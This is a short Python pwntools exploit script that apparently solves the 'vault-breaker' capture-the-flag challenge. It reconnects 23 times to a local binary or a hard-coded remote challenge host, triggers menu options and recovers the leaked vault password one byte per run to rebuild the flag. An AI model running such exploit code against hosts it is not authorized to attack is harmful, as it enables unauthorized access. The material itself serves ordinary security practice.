#!/usr/bin/env python3
#18-05-2022
#Gon

from pwn import *
exe = ELF('./vault-breaker_no_alarm')

context.binary = exe
context.log_level='info'

count = 0
flag = b''

def conn():
    if args.REMOTE:
        io = remote('178.62.43.214', 32476)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

def generate(length):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(length))

def secure():
    io.sendlineafter(b'> ', b'2')

for i in range(23):
    io = conn()
    generate(i)
    secure()
    io.recvuntil(b'Master password for Vault: ')
    leak = io.recv(32)
    flag += leak[i:i+1]
    print(flag)

#io.interactive()
